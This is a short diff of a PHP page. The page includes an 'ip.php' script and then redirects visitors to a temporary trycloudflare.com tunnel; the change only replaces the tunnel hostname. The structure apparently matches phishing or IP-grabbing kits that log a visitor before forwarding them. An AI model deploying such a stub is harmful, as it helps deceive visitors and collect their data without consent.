@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: https://hormone-mid-ontario-assisted.trycloudflare.com/index.html');
+header('Location: https://usa-thomson-requires-constant.trycloudflare.com/index.html');
 exit
 ?>
